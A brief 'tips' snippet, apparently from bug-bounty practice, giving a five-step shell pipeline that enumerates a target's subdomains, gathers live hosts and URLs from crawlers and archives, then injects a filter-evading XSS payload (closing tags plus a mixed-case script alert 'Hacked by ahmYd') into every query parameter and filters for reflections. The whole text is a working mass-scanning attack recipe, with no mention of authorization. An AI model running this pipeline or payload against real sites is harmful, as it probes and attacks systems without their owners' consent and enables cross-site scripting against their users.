```
Tips :

1) Subfinder -d target.com -all -o subdomains.txt

2) cat subdomains.txt | httprobe | tee -a host.txt

3) cat host.txt | hakrawler | tee -a endpoint.txt
cat host.txt | waybackurls | tee -a endpoint.txt

4) cat endpoint.txt | qsreplace '%27"></a></script></title></form></span></meta></style></iframe></noscript></textarea></xmp></pre><ScRiPt>alert(/Hacked%20by%20ahmYd/)</sCrIpT>' | tee -a xss_fuzz.txt

5) cat xss_fuzz.txt | freq | tee -a possible_xss.txt


	```